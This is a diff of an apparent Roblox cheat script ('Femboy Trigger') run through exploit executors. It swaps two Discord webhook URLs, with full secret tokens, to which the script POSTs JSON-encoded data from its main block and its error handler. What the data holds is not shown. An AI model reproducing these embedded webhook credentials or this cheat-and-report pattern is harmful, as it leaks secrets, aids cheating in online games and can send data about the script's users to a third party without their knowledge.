@@ -105,7 +105,7 @@ local Success, Error = pcall(function()
         local Encoded                  = HttpService:JSONEncode(Data)
 
         Request                        = http_request or request or HttpPost or syn.request
-        local Final = {Url             = "https://discord.com/api/webhooks/965531360410353674/MWLW4mIm_PNO9rWrum1a42d2BdrGAmMTAzvW_VvAzhj2IIROHzgtqod4gXz4SELAjhA6", Body = Encoded, Method = "POST", Headers = Headers}
+        local Final = {Url             = "https://discord.com/api/webhooks/965561459595690055/OuxOrItkIYrtiYRX6fBMvTXVx105TimI1sWObYUdu61nPO3T0Fnt9Yc5rB1d00r_IYS9", Body = Encoded, Method = "POST", Headers = Headers}
 
         Request(Final)
     end
@@ -606,7 +606,7 @@ local Success, Error = pcall(function()
     if UIKey == nil then UIKey = Enum.KeyCode.BackSlash end
     local FemWare                  = Framework:CreateWindow("Femboy Trigger", Vector2.new(492, 588), UIKey)
 
-    local Credits                  = FemWare:CreateTab("Info")
+    local Credits                  = FemWare:CreateTab("Settings")
     local General                  = FemWare:CreateTab("General")
     local Visuals                  = FemWare:CreateTab("Visuals")
     local TeleportsS               = FemWare:CreateTab("Teleports")
@@ -1810,7 +1810,7 @@ if not Success and Error then
         local Encoded                  = HttpService:JSONEncode(Data)
 
         Request                        = http_request or request or HttpPost or syn.request
-        local Final = {Url             = "https://discord.com/api/webhooks/965531440093757480/SPKZCglta1Wt40tTfkxU7f0QI6vrAXez4swlI7_bkZpVc_8rKILhgDHe3X-FQI2579V5", Body = Encoded, Method = "POST", Headers = Headers}
+        local Final = {Url             = "https://discord.com/api/webhooks/965561570706985001/VP5cecoPRIfWvOStP_bI6r0Srcrj8rbtEwvGU6fKOY9NgH3fKKRN7kRogpR0o_ayAzvQ", Body = Encoded, Method = "POST", Headers = Headers}
 
         Request(Final)
     
